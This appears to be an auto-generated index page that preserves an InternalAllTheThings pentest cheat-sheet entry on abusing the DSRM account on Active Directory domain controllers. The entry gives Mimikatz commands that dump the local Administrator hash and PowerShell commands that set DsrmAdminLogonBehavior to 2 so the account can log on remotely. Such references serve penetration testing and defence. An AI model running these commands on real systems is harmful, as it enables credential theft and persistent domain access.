---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - DSRM Credentials

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-dsrm-credentials` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-dsrm-credentials.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password - DSRM Credentials](../../topics/active-directory/password-dsrm-credentials.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-pwd-dsrm-credentials |
| name | Password - DSRM Credentials |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-dsrm-credentials.md |

## Preserved Source Material

````yaml
_body: "# Password - DSRM Credentials\n\n> Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server\
  \ domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.\n\
  \nThis is the local administrator account inside each DC. Having admin privileges in this machine, you can use Mimikatz\
  \ to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access\
  \ to this local Administrator user.\n\n```ps1\nInvoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"'\n\n# Check\
  \ if the key exists and get the value\nGet-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior\
  \ \n\n# Create key with value \"2\" if it doesn't exist\nNew-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\\
  LSA\" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD \n\n# Change value to \"2\"\nSet-ItemProperty \"HKLM:\\\
  SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2\n```"
_relative_path: active-directory/pwd-dsrm-credentials.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-dsrm-credentials.md
````
